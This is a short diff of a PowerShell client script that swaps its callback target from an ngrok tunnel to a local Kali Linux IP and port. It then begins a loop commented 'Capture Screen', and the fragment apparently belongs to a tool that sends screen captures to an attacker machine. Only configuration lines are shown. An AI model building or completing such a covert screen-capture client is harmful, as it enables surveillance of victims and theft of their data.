@@ -1,6 +1,6 @@
 # PowerShell Client Script
-$kaliIP = "4.tcp.eu.ngrok.io" # Replace with your Kali Linux IP address
-$port = 11099
+$kaliIP = "192.168.0.111" # Replace with your Kali Linux IP address
+$port = 5000
 
 while ($true) {
     # Capture Screen
